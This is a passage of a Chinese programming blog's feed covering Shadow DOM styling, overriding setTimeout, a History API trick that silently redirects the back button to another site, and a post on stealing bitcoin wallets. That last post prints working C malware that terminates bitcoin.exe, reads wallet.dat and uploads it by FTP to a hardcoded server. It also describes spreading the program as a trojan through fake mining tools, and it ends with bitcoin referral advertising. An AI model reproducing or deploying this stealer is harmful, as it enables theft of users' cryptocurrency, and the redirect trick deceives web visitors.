    <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"breaking"</span>&gt;</span>Jiggled piece of yarn derails kitten kongress<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">div</span>&gt;</span>
<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
</pre></figure></code></pre>
<p>第二部分，由于\<content class="highlight" select=".breaking"\>所有类属性为breaking的排在顶部，这种方式称为<a href="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/shadow/index.html#reprojection">reprojection</a></p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"news"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">h1</span>&gt;</span>Good day for kittens<span class="tag">&lt;/<span class="title">h1</span>&gt;</span>
  <span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"ticker"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"breaking"</span>&gt;</span>Kitten rescued from tree<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
    <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"breaking"</span>&gt;</span>Jiggled piece of yarn derails kitten kongress<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
    <span class="tag">&lt;<span class="title">div</span>&gt;</span>Area kitten "adorable"&amp;mdash;owner<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">div</span>&gt;</span>
<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
</pre></figure></code></pre>
<p>6.3 备用内容
插入点可以有<em>content</em>，称为<a href="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/shadow/index.html#dfn-fallback-content">备用内容</a>，当插入点没有任何文本时，会显示此信息，如下：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="comment">&lt;!-- #news' shadow --&gt;</span>
<span class="tag">&lt;<span class="title">template</span> <span class="attribute">id</span>=<span class="value">"t"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span> <span class="attribute">select</span>=<span class="value">"h1"</span>&gt;</span>Today's top headlines<span class="tag">&lt;/<span class="title">content</span>&gt;</span>
  <span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"ticker"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">content</span> <span class="attribute">id</span>=<span class="value">"stories"</span>&gt;</span>
      No news
      <span class="tag">&lt;<span class="title">button</span> <span class="attribute">onclick</span>=<span class="value">"window.location.reload(true);"</span>&gt;</span>Reload<span class="tag">&lt;/<span class="title">button</span>&gt;</span>
    <span class="tag">&lt;/<span class="title">content</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">div</span>&gt;</span>
<span class="tag">&lt;/<span class="title">template</span>&gt;</span>
</pre></figure></code></pre>
<h2>6.4 多重Shadow子树</h2>
<p>一个元素可以含有不止一个shadow DOM 子树. 继承一个已具有shadow DOM子树的自定义元素是很常见的. 不过要是想重用原先的元素时怎么处理? 如何重用?
利用\<shadow\>可以调用原先申请的shadow DOM 子树，如下：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">element</span> <span class="attribute">name</span>=<span class="value">"sailing-watch"</span> <span class="attribute">extends</span>=<span class="value">"tick-tock-clock"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">template</span>&gt;</span>
    <span class="tag">&lt;<span class="title">shadow</span>&gt;</span><span class="tag">&lt;/<span class="title">shadow</span>&gt;</span>
    <span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"compass"</span>&gt;</span>N<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">template</span>&gt;</span>
  <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
    …
  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
<span class="tag">&lt;/<span class="title">element</span>&gt;</span>
</pre></figure></code></pre>
<p>由于一个元素可以有多个shadow，我们需要了解这些shadow如何相互影响，如何作用元素的子节点</p>
<p>由于你不能删除shadow root，所以shadow DOM子树生效时的顺序很重要，如下：</p>
<ul>
<li><ol>
<li>user agent shadow DOM</li>
</ol>
</li>
<li><ol>
<li>自定义元素的shadow DOM</li>
</ol>
</li>
<li><ol>
<li>第一个派生自定义元素的shadow DOM</li>
</ol>
</li>
<li><ol>
<li>...</li>
</ol>
</li>
<li><ol>
<li>用脚本添加的Ad-hoc shadow DOM</li>
</ol>
</li>
<li><ol>
<li>Decorator shadow (applied and removed with CSS rules—not technically shadow DOM, but its insertion points work similarly to shadow DOM.)</li>
</ol>
</li>
</ul>
<p>其次，根据顺序从最新生效的子树反向推倒，每一个\<content\>插入点，根据规则，可以定位任何宿主元素子节点</p>
<p>一旦子节点在正确的地方渲染，我们可以检查是否有\<shadow\>元素，如果没有，表明成功；如果有，从\<shadow\>队列元素中取出子树重复替换\<content\>插入点，直到队尾. 具体见如下图：</p>
<p><img src="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/assets/images/shadow-stack.svg" alt="shadow stack"></p>
<object data="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/assets/images/shadow-stack.svg" width="500" height="600"></object>

<p>总结一下：</p>
<ul>
<li>最近申请的shadow DOM 子树最可能在\<content\>插入点获得最新的子树</li>
<li>以此类推</li>
<li>直到当前的shadow DOM子树没有\<shadow\>，那么其就是这个元素最后的DOM子树</li>
</ul>
<h2>6.5 CSS 和 Shadow DOM</h2>
<p>当构建自定义元素时自然要考虑属性、内容和API接口. 这与页面渲染同等重要. Shadow DOM 提供给开发者很多方式控制shadow DOM内容的样式.</p>
<p>shadow DOM 子树有一个不看见的边界，user agent的样式默认生效，而不是定制的样式. 派生的元素依旧有效，这不是我们想要的. 在上面的scailing-watch的例子里，如果页面内容被渲染成绿色，如果要保持整体风格，shadow DOM内的文本由于color属性由于继承性质也会是绿色，不过设定了所有\<div\>元素橙色边框， 那direction indicator不会有橙色边框因为<strong>border</strong>并不是具有继承性质的属性</p>
<p>一个shadow根节点有两个属性控制行为. applyAuthorStyles（开发者样式）属性，shadow DOM 会匹配最接近的样式，注意这个属性只能匹配shadow DOM 子树. 使用时要注意&quot;n&quot;代选择器</p>
<p>如果<strong>applyAuthorStyles</strong>设置为false，<strong>resetStyleInheritance</strong>设置为true，样式会清空. 元素会被与页面样式隔离，你可以通过浏览器重置样式</p>
<p>在插入点有相似的界限. shadow DOM子树的样式不会再插入点分布的元素上生效. 不过要是通过选择器想渲染某一部分特定内容， 可以用<a href="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/shadow/index.html#distributed-pseudo-element">::distributed pseudo-selector</a>，如下：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="comment">&lt;!-- #ticker's shadow --&gt;</span>
<span class="tag">&lt;<span class="title">template</span> <span class="attribute">id</span>=<span class="value">"u"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css">
    <span class="tag">content</span><span class="pseudo">::distributed(</span>*) <span class="rules">{
      <span class="rule"><span class="attribute">display</span>:<span class="value"> inline-block;</span></span>
    <span class="rule">}</span></span>
    *<span class="pseudo">::distributed(</span><span class="class">.breaking</span>) <span class="rules">{
      <span class="rule"><span class="attribute">text-shadow</span>:<span class="value"> <span class="number">0</span> <span class="number">0</span> <span class="number">0.2</span>em maroon;</span></span>
      <span class="rule"><span class="attribute">color</span>:<span class="value"> orange;</span></span>
    <span class="rule">}</span></span>
  </span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span> <span class="attribute">class</span>=<span class="value">"highlight"</span> <span class="attribute">select</span>=<span class="value">".breaking"</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
<span class="tag">&lt;/<span class="title">template</span>&gt;</span>
</pre></figure></code></pre>
<p>上述包含了两个规则，选择器的左半部分是shadow DOM 生效；括号内代表适用元素。第一个选择器对\<content\>的所有元素有效；第二个选择器对类对象为breaking的元素有效</p>
<p>ShadowDOM 也可以定制宿主元素的样式. 代码如下：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="comment">&lt;!-- #ticker's shadow --&gt;</span>
<span class="tag">&lt;<span class="title">template</span> <span class="attribute">id</span>=<span class="value">"u"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css">
    <span class="at_rule">@host </span>{
      <span class="pseudo">:scope</span> <span class="rules">{
        <span class="rule"><span class="attribute">white-space</span>:<span class="value"> nowrap;</span></span>
        <span class="rule"><span class="attribute">overflow-style</span>:<span class="value"> marquee-line;</span></span>
        <span class="rule"><span class="attribute">overflow-x</span>:<span class="value"> marquee;</span></span>
      <span class="rule">}</span></span>
    }
    <span class="tag">content</span><span class="pseudo">::distributed(</span>*) <span class="rules">{
      <span class="rule"><span class="attribute">display</span>:<span class="value"> inline-block;</span></span>
    <span class="rule">}</span></span>
    *<span class="pseudo">::distributed(</span><span class="class">.breaking</span>) <span class="rules">{
      <span class="rule"><span class="attribute">text-shadow</span>:<span class="value"> <span class="number">0</span> <span class="number">0</span> <span class="number">0.2</span>em maroon;</span></span>
      <span class="rule"><span class="attribute">color</span>:<span class="value"> orange;</span></span>
    <span class="rule">}</span></span>
  </span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span> <span class="attribute">class</span>=<span class="value">"highlight"</span> <span class="attribute">select</span>=<span class="value">".breaking"</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
<span class="tag">&lt;/<span class="title">template</span>&gt;</span>
</pre></figure></code></pre>
<p>最后，有两种方式可以使shadow DOM 子树的样式与页面保持一致. 首先通过分配一个伪ID暴漏shadow DOM 子树中的特定元素，开发者可以定制其样式. 例如：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
<span class="comment">// Set up shadow DOM</span>
…
<span class="keyword">var</span> ticker = r.querySelector(<span class="string">'#ticker'</span>);
ticker.pseudo = <span class="string">'x-ticker'</span>;
…
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>

<span class="comment">&lt;!-- change the appearance of the ticker part --&gt;</span>
<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css">
<span class="id">#news</span><span class="pseudo">::x-ticker</span> <span class="rules">{
  <span class="rule"><span class="attribute">background</span>:<span class="value"> gray;</span></span>
  <span class="rule"><span class="attribute">color</span>:<span class="value"> lightblue;</span></span>
<span class="rule">}</span></span>
</span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>
</pre></figure></code></pre>
<p>另一种方法是通过CSS变量进行控制，如下：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="comment">&lt;!-- #ticker's shadow --&gt;</span>
<span class="tag">&lt;<span class="title">template</span> <span class="attribute">id</span>=<span class="value">"u"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css">
    <span class="at_rule">@host </span>{
      <span class="pseudo">:scope</span> <span class="rules">{
        <span class="rule"><span class="attribute">white-space</span>:<span class="value"> nowrap;</span></span>
        <span class="rule"><span class="attribute">overflow-style</span>:<span class="value"> marquee-line;</span></span>
        <span class="rule"><span class="attribute">overflow-x</span>:<span class="value"> marquee;</span></span>
      <span class="rule">}</span></span>
    }
    <span class="tag">content</span><span class="pseudo">::distributed(</span>*) <span class="rules">{
      <span class="rule"><span class="attribute">display</span>:<span class="value"> inline-block;</span></span>
    <span class="rule">}</span></span>
    *<span class="pseudo">::distributed(</span><span class="class">.breaking</span>) <span class="rules">{
      <span class="rule"><span class="attribute">text-shadow</span>:<span class="value"> <span class="number">0</span> <span class="number">0</span> <span class="number">0.2</span>em <span class="function">var(highlight-accent, maroon)</span>;</span></span>
      <span class="rule"><span class="attribute">color</span>:<span class="value"> <span class="function">var(highlight-primary, orange)</span>;</span></span>
    <span class="rule">}</span></span>
  </span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span> <span class="attribute">class</span>=<span class="value">"highlight"</span> <span class="attribute">select</span>=<span class="value">".breaking"</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
<span class="tag">&lt;/<span class="title">template</span>&gt;</span>

<span class="comment">&lt;!-- change the appearance of the ticker part --&gt;</span>
<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css">
<span class="id">#news</span><span class="pseudo">::x-ticker</span> <span class="rules">{
  <span class="rule"><span class="attribute">background</span>:<span class="value"> gray;</span></span>
  <span class="rule"><span class="attribute">color</span>:<span class="value"> lightblue;</span></span>
  <span class="rule"><span class="attribute">var-highlight-primary</span>:<span class="value"> green;</span></span>
  <span class="rule"><span class="attribute">var-highlight-accent</span>:<span class="value"> yellow;</span></span>
<span class="rule">}</span></span>
</span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>
</pre></figure></code></pre>
<p>伪元素方法针对特定元素保持页面样式非常有用，而CSS变量则对不想重复指定的属性集（主题风格）非常有用. </p>
<h2>6.6 Shadow DOM中的事件</h2>
<p>为了确保shadow DOM子树中的元素不会暴露给外部子树，会有很多工作来分发内部子树事件. 
首先，shadow DOM 子树会阻止事件如mutation和selectstart外部监听. 那些能够穿过shadow DOM的范围并且重定向的的事件，它们的<strong>target</strong>和<strong>relatedTarget</strong>的会指向shadow DOM子树的宿主元素. 在一些情况下，如<strong>DOMFocusIn</strong>，<strong>mouseover</strong>，<strong>mouseout</strong>事件需要特别注意，如果你在shadow DOM的两个元素中间移动鼠标，会出现鼠标从本身移动到它本身这种诡异的事件</p>
<h2>7 Imports</h2>
<p>规范标准见这里<a href="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/imports/index.html">The HTML Imports specification</a></p>
<p>Custom elements 和 decorators可以通过文件的方式引入：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">link</span> <span class="attribute">rel</span>=<span class="value">"import"</span> <span class="attribute">href</span>=<span class="value">"goodies.html"</span>&gt;</span>
</pre></figure></code></pre>
<p>只有\<decorator\>元素和\<element\>能被user agent解析，脚本也可以通过<strong>import</strong>属性获取DOM.  跨域检索的文档可以通过CORS判定这些定义是否可以跨站运行. </p>
<p><strong>SuetMing 保留部分权力。基于“<a href="http://creativecommons.org/licenses/by-sa/3.0/">CC 3.0 BY-SA 协议</a>”发布</strong></p>
]]></content>
    <category scheme="http://suetming.com/categories/javascript/" term="javascript"/>
  </entry>
  <entry>
    <title type="html"><![CDATA[重写全局方法 | JavaScript]]></title>
    <link href="http://suetming.com/2013/08/11/2013-06-23-overwrite-global-methods/"/>
    <id>http://suetming.com/2013/08/11/2013-06-23-overwrite-global-methods/</id>
    <published>2013-08-11T10:54:00.000Z</published>
    <updated>2013-08-11T10:54:00.000Z</updated>
    <content type="html"><![CDATA[<p>前端开发有时需要重新全局函数，但是想要适用于所有浏览器，且在某些情景下又需要原有函数，则要麻烦的多，本文已 &quot;setTimeout&quot; 为例，实现一个适用于所有浏览器的影响最小的方法</p>
<p><a name="more"></a></p>
<h2>首次尝试</h2>
<pre><code><figure class="highlight"><pre>setTimeout = function() {}<span class="comment">;</span>
// <span class="keyword">or</span>
window<span class="preprocessor">.setTimeout</span> = function() {}<span class="comment">;</span>
</pre></figure></code></pre>
<p>上述适用于大多数情况，但是&lt;=IE8则会出现问题，第一个会抛异常 &quot;Object doesn&#39;t support this action&quot;。第二种可行，但是会影响window.setTimeout，并不是最理想的</p>
<h2>再次尝试</h2>
<pre><code><figure class="highlight"><pre><span class="keyword">var</span> setTimeout = <span class="keyword">function</span>() {};
</pre></figure></code></pre>
<p>如果通过声明变量的方式，setTimeout 和 window.setTimeout则可以同时引用，不会抛出异常，可以进行所有操作，不过初始的setTimeout怎么处理？通过另外一个变量简介引用？</p>
<pre><code><figure class="highlight"><pre><span class="keyword">var</span> temp = setTimeout,setTimout = <span class="keyword">function</span>() {};
</pre></figure></code></pre>
<p>是不是这样setTimeout就能被调用？根据变量提升（hoisting）规则，输出为undefined， 即使设置为 var temp = window.setTimeout效果一样，如果找到最初的setTimeout实现方法会怎样？window.constructor.prototype.setTimeout</p>
<ul>
<li>大部分浏览器，窗口是由一个函数&quot;DOMWindow&quot;构建的，即 window.constructor === &quot;DOMWindow&quot;，而Safari并不能直接获得DOMWindow而是通过构造函数代替引用对象,不过根据ECMAScript5的__proto__标准可以定位函数<strong>&quot;window.__proto__.setTimeout&quot;</strong>，最终形式</li>
</ul>
<pre><code><figure class="highlight"><pre>(window.<span class="command">\_</span><span class="command">\_</span>proto<span class="command">\_</span><span class="command">\_</span> || window.constructor.prototype).setTimeout
</pre></figure></code></pre>
<ul>
<li>Opera无法通过window.constructor.prototype获得prototype不过可以通过<strong>window.__proto__</strong>得到</li>
<li>&lt;=IE7的IE系列并没有构造函数或者__proto__并没有其他方式直接获得prototype</li>
</ul>
<p>上述使得在全局下定位初始setTimeout变得异常复杂</p>
<h2>实践</h2>
<p>由于JavaScript&#39;s Hoisting规则带来的异常复杂性，最好的方式就是规避它，我们知道提升是在执行script时发生的，那么通过下述方法则很同意规避</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
    <span class="keyword">var</span> temp = setTimeout;
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
    <span class="keyword">var</span> setTimeout = <span class="keyword">function</span>() {};
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</pre></figure></code></pre>
<p>虽然这是个不错的解决方法，但并不是完全由JS实现的，那么有没有JS的方法呢</p>
<pre><code><figure class="highlight"><pre>var temp = set<span class="variable">Timeout</span>;
<span class="function"><span class="title">eval</span><span class="params">(<span class="string">"var setTimeout;"</span>)</span>;
<span class="title">setTimeout</span> = <span class="title">function</span><span class="params">()</span> {};
</pre></figure></code></pre>
<p>上述方法通过<strong>eval</strong>达到目的，不过烦人的IE并不允许直接重写setTimeout, 上述方法需要稍微改动一下，使其能够重载， 方法在IE6/7/8/9、Chrome、Safari、Firefox 和 Opera没有任何问题。</p>
<h2>最佳实践</h2>
<p>在进行深度挖掘，其实发现大道至简</p>
<p>在IE 7、8的js console 下输入</p>
<pre><code><figure class="highlight"><pre>window<span class="preprocessor">.setTimeout</span> = <span class="number">1</span><span class="comment">;</span>
setTimeout<span class="comment">;                // 1</span>
setTimeout = <span class="number">2</span><span class="comment">;            // 2</span>
</pre></figure></code></pre>
<p>在打开新的控制台试试下述代码</p>
<pre><code><figure class="highlight"><pre>setTimeout;
window.setTimeout = <span class="number">1</span>;
setTimeout;                    // {<span class="keyword">...</span>}
window.setTimeout;            // <span class="number">1</span>
setTimeout = <span class="number">1</span>;                // Error
</pre></figure></code></pre>
<p>可能的原因是IE会优化本地代码把所有prototype中的全局对象会自动缓存下来，如果思路正确的话那么只要引用自身则可以阻止此问题</p>
<pre><code><figure class="highlight"><pre>window<span class="preprocessor">.setTimeout</span> = window<span class="preprocessor">.setTimeout</span><span class="comment">;</span>
</pre></figure></code></pre>
<p>由于等式左边的window.setTimeout不会进入prototype，而等式右边则在prototype中，IE这种奇特的方式可以运用到很多函数中比如alert、blur、scrollTo等</p>
<p>这个方法所有浏览器均适用，简单的问题VS简单的结果，比较理想</p>
]]></content>
    <category scheme="http://suetming.com/tags/javascript/" term="javascript"/>
    <category scheme="http://suetming.com/categories/javascript/" term="javascript"/>
  </entry>
  <entry>
    <title type="html"><![CDATA[利用history api截获返回事件]]></title>
    <link href="http://suetming.com/2013/08/11/2013-06-08-capture-back-menu-with-history-api/"/>
    <id>http://suetming.com/2013/08/11/2013-06-08-capture-back-menu-with-history-api/</id>
    <published>2013-08-11T10:53:55.000Z</published>
    <updated>2013-08-11T10:53:55.000Z</updated>
    <content type="html"><![CDATA[<p>如果你看过这个<a href="http://vimeo.com/64567684">视频</a>(需要翻墙)，浏览网页时点击链接进入另一个网页后，点击返回或者右键返回，你会发现返回的不是之前的网站而是一个新的网站,这是通过history api替换之前记录然后调用location.</p>
<p><a name="more"></a>
replace造成的实现方式如下:</p>
<figure class="highlight lang-javascript"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="code"><pre>
history.replaceState(<span class="literal">null</span>
	, document.title
	, location.pathname + <span class="string">"#!/history"</span>);

history.pushState(<span class="literal">null</span>, document.title, location.pathname);

window.addEventListener(<span class="string">"popstate"</span>, <span class="keyword">function</span>() {
  <span class="keyword">if</span>(location.hash === <span class="string">"#!/history"</span>) {
	history.replaceState(<span class="literal">null</span>
		, document.title
		, location.pathname);
	setTimeout(<span class="keyword">function</span>(){
	  location.replace(<span class="string">"http://www.suetming.com/"</span>);
	},<span class="number">0</span>);
  }
}, <span class="literal">false</span>);
</pre></td></tr></table></figure>


<p>上述实例通过“#!/history”替换当前url，通过“popstate”，偷偷改变为其他域名</p>
<p>Firefox/Chrome 会有闪屏后返回新页面，Opera/Safari则会立即返回,通过replaceState重置url可以消除这种现象</p>
<figure class="highlight lang-javascript"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre>
history.replaceState(<span class="literal">null</span>, document.title, location.pathname);
</pre></td></tr></table></figure>


<ul>
<li><a href="http://jsfiddle.net/elastix/JNwDq/embedded/result/">demo地址</a></li>
<li><a href="http://jsfiddle.net/elastix/JNwDq/">源码地址</a></li>
</ul>
<p>说明了上述原理，是为了说明浏览器API仍有很多用户体验不佳的情况，请不要用于web</p>
]]></content>
    <category scheme="http://suetming.com/tags/历史记录/" term="历史记录"/>
    <category scheme="http://suetming.com/categories/javascript/" term="javascript"/>
  </entry>
  <entry>
    <title type="html"><![CDATA[如果偷取别人的比特币]]></title>
    <link href="http://suetming.com/2013/08/11/2013-05-22-free-bitcoin/"/>
    <id>http://suetming.com/2013/08/11/2013-05-22-free-bitcoin/</id>
    <published>2013-08-11T10:53:43.000Z</published>
    <updated>2013-08-11T10:53:43.000Z</updated>
    <content type="html"><![CDATA[<p>“如何获取偷取别人的<strong>wallet.dat</strong>文件”，这个文件包含所有的虚拟币，当然阐述此文的目的不是让你偷取别人的比特币而是让你知道如何保护自己的电子钱包
整个流程其实很简单，一小段C语言代码运行查找appdata文件夹下的wallet.dat文件，然后通过FTP上传至别人的电脑，或者通过其他文件传输协议，黑客通过加壳重命名、类似的代码注入、传播、扩散可以很轻松的获取别人的电子钱包</p>
<p><img src="/images/photos/2012-05-24-steal-bitcoin-01.png" alt="steal bitcoin"></p>
<p><a name="more"></a></p>
<h2>黑客如何知道我有比特币，如何有效传播木马给比特币的用户？</h2>
<p>很简单，学习过社会工程学的基本知识就可以搞定，绑定这个木马到任何相关的比特币程序中,比如官网的“比特币挖矿机”,&quot;Bitcoin Stealer Maker&quot;这个木马本身,然后上传一段视频教程到视频网站,然后在论坛推广,多数人会受不了这个诱惑，下载了木马，然后....就没有然后了,因为虽说是木马,但是现在的防毒防木马软件根本无法察觉,因为这种可以说不是木马也不是病毒,可以完全无法察觉,当你觉得你赚取了别人的比特币,实际上已经被别人偷去了比特币</p>
<h2>如何写一个偷取比特币的程序？</h2>
<p>下面的程序是一个简单的例子，切记不要用于任何非法盈利比特币的行为中</p>
<figure class="highlight lang-c"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre></td><td class="code"><pre>
<span class="preprocessor">#include &lt;windows.h&gt;</span>
<span class="preprocessor">#include &lt;tlhelp32.h&gt;</span>
<span class="preprocessor">#include &lt;tchar.h&gt;</span>

<span class="preprocessor">#include &lt;wininet.h&gt;</span>
<span class="preprocessor">#include &lt;ctime&gt;</span>
<span class="preprocessor">#include &lt;iostream&gt;</span>
<span class="preprocessor">#pragma comment(lib, "wininet")</span>

<span class="keyword">void</span> killprocess()
{
	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="number">0</span> );
    <span class="comment">// Get the process list snapshot.</span>
    PROCESSENTRY32 ProcessEntry = { <span class="number">0</span> };
    <span class="comment">// Initialize the process entry structure.</span>
    ProcessEntry<span class="variable">.dwSize</span> = <span class="keyword">sizeof</span>( ProcessEntry );
    <span class="comment">// Get the first process info</span>
    <span class="built_in">BOOL</span> Return = <span class="literal">FALSE</span>;
    Return = Process32First( hProcessSnapShot,&amp;ProcessEntry );
    <span class="keyword">int</span> value = _tcsicmp(ProcessEntry<span class="variable">.szExeFile</span>, _T(<span class="string">"bitcoin.exe"</span>));
    
    <span class="keyword">if</span> (value==<span class="number">0</span>)
    {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE
        	, <span class="literal">FALSE</span>
        	, ProcessEntry<span class="variable">.th32ProcessID</span>);
        <span class="comment">//Open Process to terminate</span>
        TerminateProcess(hProcess,<span class="number">0</span>);
        CloseHandle(hProcess); <span class="comment">//Close Handle }</span>
    }
    
    <span class="keyword">while</span>( Process32Next( hProcessSnapShot, &amp;ProcessEntry ));
    CloseHandle( hProcessSnapShot );
}

<span class="keyword">int</span> WINAPI WinMain(HINSTANCE hInstance
, HINSTANCE hPrevInstance
, LPSTR lpCmdLine
, <span class="keyword">int</span> nCmdShow)
{
    killprocess();
    Sleep(<span class="number">40000</span>);

    <span class="comment">// 随机种子</span>
    srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));
    <span class="keyword">int</span> seedone=rand();                             
    <span class="keyword">int</span> seedtwo=rand()*<span class="number">3</span>;                           
    <span class="keyword">int</span> seedboth = seedone + seedtwo;

    <span class="comment">// 强转int同char</span>
    <span class="keyword">char</span> randomseed[<span class="number">99</span>];
	itoa(seedboth,randomseed,<span class="number">10</span>);

    <span class="comment">// 防止wallet.dat因相同文件名而在ftp时被重写</span>
    <span class="keyword">char</span>* appdata = getenv(<span class="string">"APPDATA"</span>);  <span class="comment">// %Appdata%</span>
    <span class="keyword">char</span>* truepath = strcat(appdata, <span class="string">"\\Bitcoin\\wallet.dat"</span>);

    <span class="comment">//ftp</span>
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    hInternet = InternetOpen(<span class="literal">NULL</span>,INTERNET_OPEN_TYPE_DIRECT,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>);
    hFtpSession = InternetConnect(hInternet
    	, <span class="string">"ftp.host.com"</span>
    	, INTERNET_DEFAULT_FTP_PORT
    	, <span class="string">"user@host.com"</span>
    	, <span class="string">"bigdickben"</span>
    	, INTERNET_SERVICE_FTP
    	, <span class="number">0</span>, <span class="number">0</span>);  <span class="comment">//ftp host, user, pass</span>

    FtpPutFile(hFtpSession
    	, truepath 
    	, randomseed 
    	, FTP_TRANSFER_TYPE_BINARY, <span class="number">0</span>);
    FtpPutFile(hFtpSession
    	, truepath
    	, randomseed
    	, FTP_TRANSFER_TYPE_BINARY, <span class="number">0</span>);

    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);
   
    <span class="keyword">return</span> <span class="number">0</span>;
}
</pre></td></tr></table></figure>


<p>当然真正的木马不会像上面的程序这样简单，可能会混淆特征码，加壳，添加复制自身代码，写到其他程序中等等方式隐蔽自己，所以亲，如果你不是程序高手请珍惜比特币，远离XXXX</p>
<p><img src="/images/photos/2012-05-24-steal-bitcoin-02.png" alt="steal bitcoin"></p>
<p>记住不要被欲望冲昏了头脑迷住了眼睛</p>
<h2><strong>【广告】免费获得比特币(10+持续更新中)</strong></h2>
<p>赠送的额度随着比特币的价值波动变化，目前基本领取的是越来越少</p>
<h2>完成任务获取</h2>
<ul>
<li><a href="http://cur.lv/yj50">bitvisit</a> <strong>强力推荐</strong>每隔5分钟点击next会获得不定量的比特币，非常不错，可以开多个窗口哦【建议】</li>
<li><a href="http://cur.lv/yjdx">iwantfreebitcoins</a> 填写各种调查问卷、安装试用软件或者其它小任务免费得到比特币【不建议】</li>
<li><a href="http://www.bitcoinget.com/">bitcoinget</a>问卷调查、视频、其他任务【不建议】</li>
<li><a href="http://cur.lv/yshe">CoinTube</a> 看视频获取</li>
<li><a href="http://cur.lv/ysid">Coin Reaper</a> 随机读取一个免费比特币网站赚取</li>
</ul>
<h2>发布链接和打广告</h2>
<ul>
<li><a href="http://cur.lv/yk3p">Anonymous Ads</a> 类似Google AdSense的广告商，不过它的特色在匿名性，不需要注册，只要提供一个收款用的比特币地址即可运作，当然也可以在上面登广告</li>
<li><a href="https://coinurl.com/">CoinURL</a> 提供了一个带广告的短链接，这样你就可以从对外张贴它处理后的短链接来赚比特币了，所以即使你不是网站主或者博主也可以通过论坛签名里的链接改成此短链接等方式来挣比特币，另外也提供类似Google AdSense的广告服务</li>
</ul>
<h2>一次性提供免费比特币</h2>
<ul>
<li><a href="http://cur.lv/yk4j">Bitcoin Street Faucet</a> 填写手机号，认证后免费获赠比特币</li>
